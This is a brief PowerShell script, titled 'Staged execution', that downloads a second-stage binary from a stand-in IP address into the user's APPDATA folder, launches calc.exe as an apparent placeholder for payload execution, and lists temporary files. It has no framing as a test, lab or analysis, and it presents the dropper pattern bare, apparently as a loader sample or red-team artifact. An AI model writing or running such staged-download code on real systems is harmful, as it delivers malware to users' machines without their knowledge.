
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://192.0.2.88/cdn/stage2.bin',
    [string]$DownloadPath = "$env:APPDATA\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DownloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
